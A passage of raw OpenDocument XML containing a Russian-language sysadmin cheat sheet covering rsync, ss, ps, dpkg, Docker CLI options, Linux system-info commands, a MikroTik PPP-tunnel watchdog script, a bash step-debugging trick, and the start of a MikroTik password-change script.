      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/>- </text:span><text:span text:style-name="T2">exclude</text:span><text:span text:style-name="T3"> - Исключить файлы по шаблону;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: </text:span><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ . - из подкаталога в текущий каталог</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ </text:span><text:span text:style-name="T2">aaa</text:span><text:span text:style-name="T3">/ - из подпапки в подпапку </text:span><text:span text:style-name="T2">aaa</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avz</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ </text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">beget</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tech</text:span><text:span text:style-name="T3">:/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">code</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">skills</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ru</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">html</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sources</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ - передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">avze</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ </text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">beget</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tech</text:span><text:span text:style-name="T3">:/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">digita</text:span><text:span text:style-name="T3">6</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">code</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">skills</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ru</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">public</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">html</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sources</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">skillproject</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/ - то же самое м явным указанием </text:span><text:span text:style-name="T2">ssh</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3">: -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">listening</text:span><text:span text:style-name="T3"> - посмотреть только прослушиваемые порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">program</text:span><text:span text:style-name="T3"> - показать имя программы и ее </text:span><text:span text:style-name="T2">PID</text:span><text:span text:style-name="T3">;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> - показать </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">udp</text:span><text:span text:style-name="T3"> показать </text:span><text:span text:style-name="T2">udp</text:span><text:span text:style-name="T3"> порты;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> или - </text:span><text:span text:style-name="T2">numeric</text:span><text:span text:style-name="T3"> показывать </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> адреса в числовом виде.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: </text:span><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tlpn</text:span><text:span text:style-name="T3"> - проверить все прослушивающие </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3">-порты</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">tulpn</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> :80 - показать все процессы, работающие на 80-м порту</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> - показать все процессы</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ef</text:span><text:span text:style-name="T3"> - показать подробную информацию о каждом процессе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ef</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">phantom</text:span><text:span text:style-name="T3"> - найти все процессы с именем </text:span><text:span text:style-name="T2">phantom</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3">: Показывает статистику загрузки процессора. Команды:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3"> - показывает общую информацию</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mpstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">P</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ALL</text:span><text:span text:style-name="T3"> - по каждому ядру</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Показывает потребление ОЗУ на текущий момент: </text:span><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">h</text:span><text:span text:style-name="T3"> - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">: Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3">: Пакетный менеджер для </text:span><text:span text:style-name="T2">debian</text:span><text:span text:style-name="T3"> систем (не путать с системой управления пакетами - </text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">get</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">packname</text:span><text:span text:style-name="T3">&gt; - проверить, установлен ли пакет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> - список всех пакетов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">apache</text:span><text:span text:style-name="T3">2 - проверить, установлен ли конкретный пакет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dpkg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> &lt;</text:span><text:span text:style-name="T2">package</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3">&gt; - установить пакет</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">pnltu</text:span><text:span text:style-name="T3"> - посмотреть список используемых портов</text:span></text:p>
      <text:p text:style-name="P1">Docker справочник cli</text:p>
      <text:p text:style-name="P1">docker images - показать все локальные образы docker</text:p>
      <text:p text:style-name="P1">docker rmi [-f] &lt;id|label&gt; - удалить образ c локальной машины</text:p>
      <text:p text:style-name="P1">docker rmi -f $(docker images -q) - удалить все докер образы</text:p>
      <text:p text:style-name="P1">docker build [-t &lt;label&gt;] &lt;path&gt; - построить образ на основе докерфайла</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">docker run [-dt] [--name &lt;name&gt;] [-v &lt;path:path&gt;] [-p &lt;port:port&gt;] [--...] </text:span><text:span text:style-name="T3">&lt;id|label&gt; [cmd] - запустить образ в контейнере c cmd-командой (необязательно)</text:span></text:p>
      <text:p text:style-name="P1">-d - в фоновом режиме</text:p>
      <text:p text:style-name="P1">-t - прикрепляет к контейнеру терминал</text:p>
      <text:p text:style-name="P1">-i - перенаправляет ввод/вывод на текущий терминал</text:p>
      <text:p text:style-name="P1">--name - явно указать имя контейнера, по которому можно будет обращаться к нему (иначе будет сгенерировано рэндомно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">-p &lt;external_port:internal_port&gt; - </text:span><text:span text:style-name="T3">проброс</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">-v --volume &lt;external_path:internal_path&gt; - </text:span><text:span text:style-name="T3">монтирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">папки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хоста</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">контейнер</text:span></text:p>
      <text:p text:style-name="P1">--rm - удаляет контейнер после завершения работы</text:p>
      <text:p text:style-name="P1">--memory &lt;n&gt; - позволяет указать количество ОЗУ, доступной контейнеру</text:p>
      <text:p text:style-name="P1">-P - пробрасывает все порты контейнера в хост-систему</text:p>
      <text:p text:style-name="P1">--expose - позволяет пробросить несколько портов из контейнера в хост-систему</text:p>
      <text:p text:style-name="P1">-e &lt;"FOO=bar"&gt; - добавляет переменную окружения в контейнер</text:p>
      <text:p text:style-name="P13">docker ps [-a] - показать все запущенные [существующие] докер контейнеры</text:p>
      <text:p text:style-name="P13">docker ps -q | xargs docker stats - no-stream` - посмотреть ресурсы, потребляемые запущенными контейнерами</text:p>
      <text:p text:style-name="P1">docker stop &lt;name&gt; - останавливает указанный образ (с сохранением данных)</text:p>
      <text:p text:style-name="P1">docker kill &lt;name&gt; - то же самое без сохранения данных</text:p>
      <text:p text:style-name="P1">docker rm &lt;name&gt; - удаляет указанный контейнер</text:p>
      <text:p text:style-name="P1">docker attach &lt;name&gt; - подключиться к выбранному докер-контейнеру</text:p>
      <text:p text:style-name="P1">docker exec [-ti] &lt;name&gt; &lt;cmd&gt; - выполняет команду в докер-контейнере</text:p>
      <text:p text:style-name="P1">docker push &lt;imagename&gt; - отправить образ в удаленный реестр</text:p>
      <text:p text:style-name="P1">docker ps -q | xargs <text:s/>docker stats --no-stream - посмотреть нагрузку на процессор и память каждого из контейнеров</text:p>
      <text:p text:style-name="P1">docker stats - похожа на предыдущую команду, но более короткая</text:p>
      <text:p text:style-name="P1">docker info --format '{{.LoggingDriver}}' - посмотреть используемый по умолчанию лог драйвер (json-file)</text:p>
      <text:p text:style-name="P1">docker logs [&lt;container_name&gt;] [-f --tail 100] - показать логи [конкретного контейнера] в терминал [последние 100 строк]</text:p>
      <text:p text:style-name="P7">docker inspect --format='{{.LogPath}}' &lt;containername&gt; -показать, где хранятся логи для конкретного контейнера</text:p>
      <text:p text:style-name="P1">Основные команды Linux: Системная информация</text:p>
      <text:p text:style-name="P1">date - вывести текущую дату и время</text:p>
      <text:p text:style-name="P1">[ммддччмм[гг]].сс - установка даты и времени (мм - месяц, дд - дата, чч - час, мм - минут, гг - год, сс - секунд)</text:p>
      <text:p text:style-name="P1">cal - вывести календарь на текущий месяц</text:p>
      <text:p text:style-name="P1">uptime - показать текущий аптайм</text:p>
      <text:p text:style-name="P1">uname - показать информацию о ядре</text:p>
      <text:p text:style-name="P1">-s - Показать имя ядра (информация выдается по умолчанию, если ни одна опция не указана)</text:p>
      <text:p text:style-name="P1">-n - Показать имя хоста.</text:p>
      <text:p text:style-name="P1">-r - Показать номер выпуска ядра. Эта опция часто используется с командами управления модулями.</text:p>
      <text:p text:style-name="P1">-v - Показать версию ядра.</text:p>
      <text:p text:style-name="P1">-m - Показать имя аппаратной платформы (CPU).</text:p>
      <text:p text:style-name="P1">-o - Показать имя операционной системы.</text:p>
      <text:p text:style-name="P1">-a - Показать всю возможную информацию.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">cat /proc/cpuinfo - информация ЦПУ</text:span></text:p>
      <text:p text:style-name="P1">cat /proc/meminfo - информация о памяти</text:p>
      <text:p text:style-name="P1">df - показать инф. о использовании дисков</text:p>
      <text:p text:style-name="P1">-t - указание типа ФС</text:p>
      <text:p text:style-name="P1">-h - в “понятном” виде</text:p>
      <text:p text:style-name="P1">-T - отображение типа ФС</text:p>
      <text:p text:style-name="P1">-i - отображение информации об inode</text:p>
      <text:p text:style-name="P1">-x fstype - исключение вывода по типу ФС</text:p>
      <text:p text:style-name="P1">du - вывести “вес” текущего каталога</text:p>
      <text:p text:style-name="P1">-s - с подкаталогами</text:p>
      <text:p text:style-name="P1">-h - в “понятном” виде</text:p>
      <text:p text:style-name="P13">-m - вывод в мегабайтах</text:p>
      <text:p text:style-name="P13">dmidecode - информация о железе, берется из API DMI (пакет pmtools)</text:p>
      <text:p text:style-name="P1">-t– указать тип устройства</text:p>
      <text:p text:style-name="P1">-t 17 - информация о памяти</text:p>
      <text:p text:style-name="P1">-q - вывод меньшей информации</text:p>
      <text:p text:style-name="P1">free - использование памяти и swap</text:p>
      <text:p text:style-name="P1">whereis file– отображение расположения файла file</text:p>
      <text:p text:style-name="P1">which app - отображает путь к команде app</text:p>
      <text:p text:style-name="P1">type app - аналог каманды which</text:p>
      <text:p text:style-name="P1">enable - вывод встроенных в интерпретатор команд</text:p>
      <text:p text:style-name="P1">lshw - обтображение списка устройств</text:p>
      <text:p text:style-name="P1">lsmod - список подключенный модулей ядра</text:p>
      <text:p text:style-name="P1">modprobe modulemane - добавления и удаления модулей ядра Linux</text:p>
      <text:p text:style-name="P1">modinfo modulename - информация о модуле modulename</text:p>
      <text:p text:style-name="P7">-F param - отображение только параметра param для модуля</text:p>
      <text:p text:style-name="P1">Команды Linux, которые должен выучить каждый разработчик:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find - https://bit.ly/3C33Py0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep - https://bit.ly/3zWDxL5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl - https://bit.ly/3wzSFgM</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lsof - https://bit.ly/3Q2h5Xi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">chmod - https://bit.ly/3bOP0oj</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar - https://bit.ly/3vXKSc7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">netstat - https://bit.ly/3JQuEY6</text:p>
      <text:p text:style-name="P7">Найдите большие файлы, занимающие слишком много места на диске в вашей системе Linux. Приведенная команда находит файлы размером более 400 МБ: find / -type f -size +400M. Вы даже можете удалить большие файлы в интерактивном режиме. Приведенная ниже команда находит файлы размером более 100 МБ в каталоге /var/log и запрашивает подтверждение, хотите ли вы их удалить: find /var/log -type f -size +100M -exec rm -i {} \;</text:p>
      <text:p text:style-name="P1">Скрипт проверки активности всех ppp-соединений</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:span></text:p>
      <text:p text:style-name="P1"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:p>
      <text:p text:style-name="P1"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local adminClient "you ppp secret admins` name"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pingNumber value=2;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local pingMin value=1;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:foreach userTest in=$pppTest do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/ppp active remove $userTest</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">}</text:p>
      <text:p text:style-name="P1">если нужно проверять только определенный вид ppp замените строку :</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># :local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">строку</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">например</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># :local pppTest value=[/ppp active find where service=pptp];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек).</text:p>
      <text:p text:style-name="P1">Как отлаживать bash-script-ы по шагам:</text:p>
      <text:p text:style-name="P1">Мне всегда хотелось иметь возможность отлаживать bash-scripts так же, как и любой другой код, т.е. по шагам, и bash такую возможность предусмотрел, но о ней не все знают. Несмотря на довольно большой опыт использования Linux, я дошёл до неё только недавно. Волшебная строчка, которую нужно добавить после #!/bin/bash, чтоб скрипт можно было отлаживать по шагам</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Процесс отладки</text:p>
      <text:p text:style-name="P1">Запускаем скрипт, перед выполнением каждой команды выводится то, что будет исполняться, затем интерпретатор начинает ожидать нажатия клавиши &lt;ENTER&gt;.</text:p>
      <text:p text:style-name="P1">Если понимаем, что что-то пошло не так, нажимаем Ctrl+C и выходим из отладки.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ингредиенты</text:span></text:p>
      <text:p text:style-name="P1">команда trap, которая умеет перехватывать разные сигналы и в нашем случае она перехватывает сигнал DEBUG, посылаемый перед выполнением команды</text:p>
      <text:p text:style-name="P1">команда read, которая умеет ожидать ввода чего-нибудь с клавиатуры (в данном случае нам нужно только либо ENTER либо Ctrl+C</text:p>
      <text:p text:style-name="P1">переменная окружения $BASH_COMMAND, валидная внутри обработчика команды trap.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># <text:s text:c="28"/>Online Bash Shell.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># Write your code in this editor and press "Run" button to execute it.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo line3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "Hello World";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Top+ SQL </text:span><text:span text:style-name="T3">вопросов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интервью</text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Database and SQL - https://bit.ly/3zGK6S7</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">2. SQL Query - https://bit.ly/3bGzN8r</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">3. MySQL - https://bit.ly/3bFkhtE</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">4. SQL Server - https://bit.ly/3A5qIj0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">5. PostgreSQL - https://bit.ly/3BOLLHP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">6. Oracle - https://bit.ly/3zF2WsH</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Скриптик переустановки пароля пользователя MikroTik</text:p>
      <text:p text:style-name="P1"># Скрипт смены пароля пользователя</text:p>
      <text:p text:style-name="P1"># только для исполнения в терминале ROS</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># by Sertik 09/06/2020</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">{</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:global EnterString do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local cont 0; :local string ""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:while ($cont!=13) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local key ([:terminal inkey])</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:if ($key!=13) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:set string ("$string"."$char")}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:set cont $key</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:return $string}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:put "Please, enter Username:"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local RegUser [$EnterString];</text:span><text:span text:style-name="T2"/></text:p>
